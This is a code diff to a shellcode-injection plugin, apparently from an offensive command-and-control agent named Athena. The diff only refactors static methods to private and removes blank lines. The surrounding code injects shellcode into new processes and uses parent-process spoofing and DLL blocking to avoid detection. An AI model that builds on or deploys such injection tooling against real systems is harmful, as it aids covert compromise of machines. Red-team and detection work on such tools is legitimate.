@@ -7,7 +7,6 @@ using shellcode_inject;
 using System.Diagnostics;
 using Athena.Commands;
 using static shellcode_inject.Native;
-using System.Reflection.Metadata.Ecma335;
 
 namespace Plugins
 {
@@ -48,11 +47,9 @@ namespace Plugins
                 {
                     InjectNewProcess(args["processName"], spoofParent, blockDlls, parent, technique, b, args["task-id"], output);
                 }
-
-                
             }
         }
-        static bool InjectNewProcessWithOutput(string processName, bool spoofParent, bool blockDlls, int parentProcessId, ITechnique method, byte[] sc, string task_id, bool output)
+        private bool InjectNewProcessWithOutput(string processName, bool spoofParent, bool blockDlls, int parentProcessId, ITechnique method, byte[] sc, string task_id, bool output)
         {
             //Credit for a lot of this code goes to #leoloobeek
             //https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs
@@ -138,9 +135,7 @@ namespace Plugins
 
             return pInfo.hProcess != IntPtr.Zero;
         }
-
-
-        static bool InjectNewProcess(string processName, bool spoofParent, bool blockDlls, int parentProcessId, ITechnique method, byte[] sc, string task_id, bool output)
+        private bool InjectNewProcess(string processName, bool spoofParent, bool blockDlls, int parentProcessId, ITechnique method, byte[] sc, string task_id, bool output)
         {
             //Credit for a lot of this code goes to #leoloobeek
             //https://github.com/leoloobeek/csharp/blob/master/ExecutionTesting.cs
@@ -218,7 +213,7 @@ namespace Plugins
 
             return pInfo.hProcess != IntPtr.Zero;
         }
-        static bool AddBlockDLLs(ref Native.STARTUPINFOEX siEx, ref IntPtr lpSize)
+        private bool AddBlockDLLs(ref Native.STARTUPINFOEX siEx, ref IntPtr lpSize)
         {
             //Initializes the specified list of attributes for process and thread creation.
 
@@ -241,7 +236,7 @@ namespace Plugins
             }
             return true;
         }
-        static bool AddSpoofParent(int parentProcessId, ref Native.STARTUPINFOEX siEx, ref IntPtr lpValueProc, ref IntPtr hStdOutWrite, ref IntPtr hDupStdOutWrite)
+        private bool AddSpoofParent(int parentProcessId, ref Native.STARTUPINFOEX siEx, ref IntPtr lpValueProc, ref IntPtr hStdOutWrite, ref IntPtr hDupStdOutWrite)
         {
             //Get a handle to the parent process
             IntPtr parentHandle = Native.OpenProcess(Native.ProcessAccessFlags.CreateProcess | Native.ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
@@ -282,7 +277,7 @@ namespace Plugins
 
             return true;
         }
-        static bool GetProcessOutput(IntPtr lpValueProc, IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, Native.STARTUPINFOEX siEx, string task_id)
+        private bool GetProcessOutput(IntPtr lpValueProc, IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, Native.STARTUPINFOEX siEx, string task_id)
         {
             CancellationTokenSource cts = new CancellationTokenSource();
             CancellationToken ct = cts.Token;
@@ -353,7 +348,7 @@ namespace Plugins
 
             return true;
         }
-        static void CleanUp(IntPtr lpValueProc, IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, Native.STARTUPINFOEX siEx)
+        private void CleanUp(IntPtr lpValueProc, IntPtr hStdOutRead, Native.PROCESS_INFORMATION pInfo, Native.STARTUPINFOEX siEx)
         {
             if (siEx.lpAttributeList != IntPtr.Zero) //Close our allocated attributes list
             {
